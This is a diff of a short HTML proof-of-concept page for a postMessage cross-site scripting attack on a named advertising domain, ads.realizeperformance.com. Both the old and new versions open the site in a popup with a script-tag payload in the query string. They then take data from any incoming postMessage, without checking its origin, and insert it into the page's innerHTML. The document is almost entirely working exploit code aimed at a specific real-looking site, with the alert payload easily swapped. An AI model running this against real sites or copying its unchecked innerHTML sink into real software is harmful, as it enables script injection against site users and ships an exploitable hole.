@@ -1,34 +1,25 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>PoC: PostMessage XSS via RealizePerformance</title>
+    <title>PostMessage XSS PoC</title>
   </head>
   <body>
     <h2>PoC: RealizePerformance PostMessage XSS</h2>
+    <button onclick="launch()">Run Exploit</button>
 
-    <button onclick="runExploit()">Run Exploit</button>
+    <div id="output"></div>
 
     <script>
-      function runExploit() {
-        // Encode script tag to avoid breaking HTML
-        const payload = encodeURIComponent('<script>alert("XSS")</script>');
+      function launch() {
+        const payloadUrl = "https://ads.realizeperformance.com/?x=%3Cscript%3Ealert('XSS')%3C/script%3E";
+        const child = window.open(payloadUrl, "targetWindow", "width=600,height=400");
 
-        // Open the vulnerable site in a popup
-        const win = window.open(
-          `https://ads.realizeperformance.com/?x=${payload}`,
-          "exploitWindow",
-          "width=600,height=400"
-        );
-
-        // Listen for the message from the child window
         window.addEventListener("message", function(event) {
-          console.log("Received message:", event.data);
-
-          if (event.data && typeof event.data.value === "string") {
-            // Simulate vulnerable injection (DOM XSS)
-            document.body.innerHTML += `<p>Injected:</p><div>${event.data.value}</div>`;
+          if (event.data && event.data.value) {
+            document.getElementById("output").innerHTML =
+              "<p><strong>Injected:</strong></p><div>" + event.data.value + "</div>";
           }
-        }, false);
+        });
       }
     </script>
   </body>
